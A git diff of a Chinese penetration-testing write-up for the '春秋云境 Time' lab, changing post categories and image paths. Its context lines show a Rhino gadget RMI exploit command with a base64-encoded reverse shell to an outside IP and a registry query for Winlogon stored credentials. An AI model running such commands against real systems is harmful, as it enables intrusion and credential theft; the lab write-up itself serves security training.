@@ -3,9 +3,7 @@ typora-root-url: 春秋云境Time
 title: 春秋云境Time
 toc: true
 categories:
-  - 技术
-  - web
-  - wp
+  - 渗透测试
 date: 2025-03-06 22:15:08
 tags: 
   - 渗透测试
@@ -90,7 +88,7 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
-![image-20260306185516900](/image-20260306185516900.png)
+![image-20260306185516900](image-20260306185516900.png)
 
 ```
 D:\download>java8 -jar "rhino_gadget.jar" rmi://39.98.108.227:1337 "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTIxLjM3LjE2LjEzOS85OTk5IDA+JjEK}|{base64,-d}|bash"
@@ -700,7 +698,7 @@ RDP上去找不到flag也无法提权，搞不到服务账户
 
 找到到domain admins路径
 
-![image-20260306203734794](/image-20260306203734794.png)
+![image-20260306203734794](image-20260306203734794.png)
 
 ```
 C:\Users>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
